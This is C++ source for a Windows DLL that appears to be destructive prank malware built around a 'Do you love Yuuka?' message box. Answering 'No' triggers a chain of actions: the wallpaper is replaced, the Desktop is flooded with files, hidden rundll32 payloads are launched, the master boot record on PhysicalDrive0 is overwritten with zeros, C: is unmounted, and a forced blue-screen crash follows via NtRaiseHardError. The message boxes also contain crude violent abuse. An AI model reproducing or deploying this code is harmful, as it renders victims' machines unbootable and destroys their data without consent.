// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include "pch.h"
#include "resource.h"
#include <string>
#include "dllmain.h"
#include <ShlObj.h>
#include <shellapi.h>
#include <stdlib.h>
#include <winternl.h>

using namespace std;
HINSTANCE hDll;
const unsigned char MBR_SIZE[512] = {};
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hDll = (HINSTANCE)hModule;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void p8() {
	BOOLEAN bEnabled;
	ULONG uResp;
	FARPROC lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	FARPROC lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

void p7() {

	DWORD exitCode = 0;
	SHELLEXECUTEINFO info = { 0 };

	info.cbSize = sizeof(SHELLEXECUTEINFO);
	info.fMask = SEE_MASK_NOCLOSEPROCESS;
	info.hwnd = NULL;
	info.lpVerb = NULL;
	info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
	info.lpParameters = L"/c mountvol C: /d";
	info.lpDirectory = NULL;
	info.nShow = SW_HIDE;
	info.hInstApp = NULL;
	ShellExecuteEx(&info);
	Sleep(10000);
	p8();
}

void p6() {
	DWORD BytesWritten;
	HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
	WriteFile(hMBR, MBR_SIZE, 512, &BytesWritten, 0);
	CloseHandle(hMBR);
	DWORD exitCode = 0;

	Sleep(20000);
	p7();
}


void p4() {
	ShellExecute(
		NULL,
		TEXT("open"),
		TEXT("cmd"),
		L"/c rundll32 C:\\Windows\\security\\database\\klzfNjYkTazNJpKNvBkL.dll, loop",
		NULL,
		SW_HIDE
	);
	p6();
}

void p3() {

	ShellExecute(
        NULL,
        TEXT("open"),
        TEXT("cmd"),
        L"/c rundll32 C:\\Windows\\security\\database\\klzfNjYkTazNJpKNvBkL.dll, pops",
        NULL,
        SW_HIDE
    );
	p4();
}

void p2() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"USERPROFILE";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\Desktop\\ILOVEYUUKA0000";
	for (int i = 0; i < 513; i++) {
		wstring j = std::to_wstring(i);
		int il = j.length();
		fullpath1 = fullpath1.replace(fullpath1.end()-il, fullpath1.end(), j);
		LPCWSTR cont1 = fullpath1.c_str();
		HINSTANCE hInstance = hDll;
		HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_TXT1), TEXT("TXT"));
		HGLOBAL hRes = LoadResource(hInstance, hResInfo);
		LPVOID memRes = LockResource(hRes);
		DWORD sizeRes = SizeofResource(hInstance, hResInfo);
		HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD dwWritten = 0;
		WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
		CloseHandle(hFile);
	}
	p3();
}

void p1() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\img.jpg";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = hDll;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDB_JPG1), TEXT("jpg"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)cont1, SPIF_UPDATEINIFILE);
	p2();
}


void message() {
	int qret;
	qret = MessageBoxA(0, "Do you love Yuuka? \nYes = \"I love her! She is a beautiful woman!\" \nNo = \"I hope she gets syphilis and fucking dies and gets all her limbs torn apart, burnt and thrown into a black hole.\"", "Question", MB_YESNO | MB_ICONQUESTION);
	if (qret == 6) {
		MessageBoxA(0, "OK :)", "Correct", MB_OK | MB_ICONINFORMATION);
	}
	else {
		MessageBoxA(0, "FUCK YOU", "FUCK YOU", MB_OK | MB_ICONHAND);
		p1();
	}
}